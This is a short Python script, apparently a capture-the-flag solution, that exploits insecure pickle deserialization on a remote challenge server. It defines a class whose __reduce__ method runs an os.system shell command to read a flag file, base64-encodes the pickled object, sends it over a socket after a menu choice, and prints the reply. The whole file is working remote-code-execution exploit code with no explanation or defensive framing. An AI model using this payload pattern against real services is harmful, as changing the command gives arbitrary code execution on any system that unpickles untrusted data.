import socket
import pickle
import base64
import os

flag_path = "/home/pyvuln2/flag.txt"

def connect():
	skt = socket.socket()
	skt.connect(("play.hexa.pro", 7879))
	return skt

class attack():
	def __reduce__(self):
		return(os.system,(("cat /home/pyvuln2/flag.txt"),))


if __name__ == '__main__':
	payload = base64.b64encode(pickle.dumps(attack()))
	s=connect()
	s.recv(1024)
	s.send(b"4\n")
	s.recv(1024)
	s.send(payload)
	print(payload)
	print(s.recv(1024))
